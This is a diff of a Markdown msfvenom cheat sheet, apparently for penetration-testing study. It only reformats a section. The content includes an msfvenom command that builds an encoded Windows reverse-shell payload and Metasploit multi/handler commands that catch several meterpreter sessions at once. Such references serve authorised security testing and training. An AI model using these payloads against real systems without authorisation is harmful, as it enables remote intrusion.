@@ -32,20 +32,20 @@ Available in PDF, DOCX and Markdown format!
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT>   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |
 
 # Multihandler Listener
-To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,
-msf>use exploit multi/handler
-msf>set payload windows/meterpreter/reverse_tcp
-msf>set lhost <IP>
-msf>set lport <PORT>
-msf> set ExitOnSession false
-msf>exploit -j
-The -j option is to keep all the connected session in the background.
+To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
+```
+msf>use exploit multi/handler  
+msf>set payload windows/meterpreter/reverse_tcp  
+msf>set lhost <IP>  
+msf>set lport <PORT>  
+msf> set ExitOnSession false  
+msf>exploit -j  
+```
+The -j option is to keep all the connected session in the background.  
 
 
 # References
 
-https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675
-
-https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
-
-http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
+https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675  
+https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/  
+http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  
